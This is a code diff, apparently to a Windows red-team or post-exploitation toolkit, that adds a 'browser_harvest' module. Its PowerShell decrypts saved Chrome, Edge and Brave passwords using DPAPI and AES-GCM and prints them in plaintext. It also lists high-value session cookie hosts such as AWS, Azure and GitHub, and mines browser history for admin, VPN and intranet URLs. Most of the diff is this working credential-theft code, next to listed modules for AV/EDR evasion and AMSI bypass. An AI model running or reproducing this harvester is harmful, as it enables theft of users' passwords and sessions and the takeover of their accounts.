@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  browser_harvest: {
+    description:
+      "Browser credential and data harvesting — extract saved passwords, cookies, history, bookmarks, and autofill data from Chrome, Edge, Firefox, and Brave. Uses DPAPI decryption for Chromium-based browsers and NSS library for Firefox. Supports all user profiles on the system",
+    args: "--action passwords|cookies|history|bookmarks|all [--browser chrome|edge|firefox|brave|all]",
+  },
   reg_secrets: {
     description:
       "Registry credential extraction — harvest stored credentials from registry: AutoLogon (DefaultPassword), WinLogon, VNC passwords, PuTTY saved sessions and SSH host keys, WinSCP stored passwords, RDP connection history, service account credentials, TeamViewer passwords, FileZilla saved servers, and custom application credential storage. Comprehensive registry-based credential sweep",
@@ -13895,6 +13900,214 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function browserHarvest(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "all"
+  const browser = argVal(args, "--browser") || "all"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Browser credential harvesting...\n"]
+
+  const script = `
+Add-Type -AssemblyName System.Security
+
+$browsers = @{
+    'Chrome' = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data"
+    'Edge' = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"
+    'Brave' = "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data"
+}
+
+$targetBrowser = '${browser}'
+
+function Decrypt-ChromiumPassword($encryptedData, $masterKey) {
+    if ($encryptedData.Length -lt 15) { return '' }
+    $header = [System.Text.Encoding]::UTF8.GetString($encryptedData[0..2])
+    if ($header -eq 'v10' -or $header -eq 'v11') {
+        $nonce = $encryptedData[3..14]
+        $ciphertext = $encryptedData[15..($encryptedData.Length-17)]
+        $tag = $encryptedData[($encryptedData.Length-16)..($encryptedData.Length-1)]
+        try {
+            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
+            $plaintext = New-Object byte[] $ciphertext.Length
+            $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
+            return [System.Text.Encoding]::UTF8.GetString($plaintext)
+        } catch {
+            return '[AES-GCM decrypt failed]'
+        }
+    } else {
+        try {
+            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, 'CurrentUser')
+            return [System.Text.Encoding]::UTF8.GetString($decrypted)
+        } catch {
+            return '[DPAPI decrypt failed]'
+        }
+    }
+}
+
+function Get-ChromiumMasterKey($userDataPath) {
+    $localStatePath = Join-Path $userDataPath "Local State"
+    if (-not (Test-Path $localStatePath)) { return $null }
+    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+    $keyWithoutDPAPI = $encryptedKey[5..($encryptedKey.Length-1)]
+    try {
+        return [System.Security.Cryptography.ProtectedData]::Unprotect($keyWithoutDPAPI, $null, 'CurrentUser')
+    } catch {
+        return $null
+    }
+}
+
+foreach ($bName in $browsers.Keys) {
+    if ($targetBrowser -ne 'all' -and $bName -ne $targetBrowser -and $bName.ToLower() -ne $targetBrowser) { continue }
+    $userDataPath = $browsers[$bName]
+    if (-not (Test-Path $userDataPath)) { continue }
+
+    Write-Output "=== $bName ==="
+    $masterKey = Get-ChromiumMasterKey $userDataPath
+
+    $profiles = @('Default') + (Get-ChildItem $userDataPath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
+
+    foreach ($profile in $profiles) {
+        $profilePath = Join-Path $userDataPath $profile
+        if (-not (Test-Path $profilePath)) { continue }
+
+        if ('${action}' -eq 'passwords' -or '${action}' -eq 'all') {
+            $loginDb = Join-Path $profilePath "Login Data"
+            if (Test-Path $loginDb) {
+                $tempDb = "$env:TEMP\\cs-login-$(Get-Random).db"
+                Copy-Item $loginDb $tempDb -Force -ErrorAction SilentlyContinue
+
+                try {
+                    Add-Type -Path "$env:SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
+                } catch {}
+
+                $connStr = "Data Source=$tempDb;Version=3;Read Only=True;"
+                try {
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr)
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0"
+                    $reader = $cmd.ExecuteReader()
+
+                    $credCount = 0
+                    while ($reader.Read()) {
+                        $url = $reader['origin_url']
+                        $user = $reader['username_value']
+                        $encPass = $reader['password_value']
+                        $pass = if ($masterKey -and $encPass.Length -gt 0) {
+                            Decrypt-ChromiumPassword ([byte[]]$encPass) $masterKey
+                        } else { '[encrypted]' }
+                        Write-Output "    [$profile] $url"
+                        Write-Output "        User: $user | Pass: $pass"
+                        $credCount++
+                    }
+                    $conn.Close()
+                    Write-Output "[*] $bName/$profile: $credCount saved passwords"
+                } catch {
+                    Write-Output "[-] SQLite read failed — browser may be running. Try: taskkill /f /im $($bName.ToLower()).exe"
+                }
+                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+            }
+        }
+
+        if ('${action}' -eq 'cookies' -or '${action}' -eq 'all') {
+            $cookieDb = Join-Path $profilePath "Network\\Cookies"
+            if (-not (Test-Path $cookieDb)) { $cookieDb = Join-Path $profilePath "Cookies" }
+            if (Test-Path $cookieDb) {
+                $tempDb = "$env:TEMP\\cs-cookies-$(Get-Random).db"
+                Copy-Item $cookieDb $tempDb -Force -ErrorAction SilentlyContinue
+                try {
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;Read Only=True;")
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT COUNT(*) as cnt FROM cookies"
+                    $total = $cmd.ExecuteScalar()
+
+                    $cmd.CommandText = "SELECT DISTINCT host_key FROM cookies WHERE host_key LIKE '%github%' OR host_key LIKE '%google%' OR host_key LIKE '%azure%' OR host_key LIKE '%aws%' OR host_key LIKE '%slack%' OR host_key LIKE '%office%' OR host_key LIKE '%microsoft%'"
+                    $reader = $cmd.ExecuteReader()
+                    $interesting = @()
+                    while ($reader.Read()) { $interesting += $reader['host_key'] }
+                    $conn.Close()
+
+                    Write-Output "    [$profile] Total cookies: $total"
+                    if ($interesting) {
+                        Write-Output "    [!] High-value session cookies for:"
+                        foreach ($h in $interesting) { Write-Output "        $h" }
+                    }
+                } catch {}
+                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+            }
+        }
+
+        if ('${action}' -eq 'history' -or '${action}' -eq 'all') {
+            $historyDb = Join-Path $profilePath "History"
+            if (Test-Path $historyDb) {
+                $tempDb = "$env:TEMP\\cs-history-$(Get-Random).db"
+                Copy-Item $historyDb $tempDb -Force -ErrorAction SilentlyContinue
+                try {
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;Read Only=True;")
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT url, title, visit_count FROM urls WHERE url LIKE '%admin%' OR url LIKE '%login%' OR url LIKE '%vpn%' OR url LIKE '%portal%' OR url LIKE '%internal%' OR url LIKE '%intranet%' ORDER BY visit_count DESC LIMIT 20"
+                    $reader = $cmd.ExecuteReader()
+                    $intUrls = @()
+                    while ($reader.Read()) { $intUrls += "$($reader['url']) (visits: $($reader['visit_count']))" }
+                    $conn.Close()
+
+                    if ($intUrls) {
+                        Write-Output "    [$profile] Interesting URLs:"
+                        foreach ($u in $intUrls) { Write-Output "        $u" }
+                    }
+                } catch {}
+                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+    Write-Output ""
+}
+
+if ($targetBrowser -eq 'all' -or $targetBrowser -eq 'firefox') {
+    Write-Output "=== Firefox ==="
+    $ffProfiles = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"
+    if (Test-Path $ffProfiles) {
+        $profiles = Get-ChildItem $ffProfiles -Directory -ErrorAction SilentlyContinue
+        foreach ($p in $profiles) {
+            Write-Output "[*] Profile: $($p.Name)"
+            $loginsJson = Join-Path $p.FullName "logins.json"
+            if (Test-Path $loginsJson) {
+                $logins = Get-Content $loginsJson -Raw | ConvertFrom-Json
+                Write-Output "    [*] Saved logins: $($logins.logins.Count)"
+                foreach ($l in $logins.logins | Select-Object -First 10) {
+                    Write-Output "    $($l.hostname) — User: $($l.encryptedUsername)"
+                }
+                Write-Output "    [*] Passwords encrypted with NSS — decrypt with: firefox_decrypt.py"
+            }
+
+            $cookieDb = Join-Path $p.FullName "cookies.sqlite"
+            if (Test-Path $cookieDb) {
+                Write-Output "    [*] Cookie database exists: $cookieDb"
+            }
+        }
+    } else {
+        Write-Output "[-] Firefox not found"
+    }
+}
+`
+  const r = await ps(script, timeout)
+  output.push(r.stdout)
+  if (r.stderr) output.push(`[!] ${r.stderr}`)
+  findings.push({
+    checkId: "WIN-BROWSER-001",
+    provider: "windows",
+    severity: r.stdout.includes("Pass:") ? "critical" : "medium",
+    status: r.stdout.includes("Pass:") ? "VULNERABLE" : "ENUMERATED",
+    resource: "browser://credentials",
+    title: "Browser credential harvest — passwords, cookies, history from all browsers",
+    details: r.stdout.substring(0, 500),
+    remediation: "Use enterprise password managers instead of browser password storage. Deploy Chrome/Edge policies to disable password saving.",
+  })
+
+  return { output: output.join("\n"), findings }
+}
+
 async function regSecrets(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "full"
   const findings: Finding[] = []
@@ -20302,6 +20515,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  browser_harvest: browserHarvest,
   reg_secrets: regSecrets,
   screenshot_grab: screenshotGrab,
   share_hunt: shareHunt,
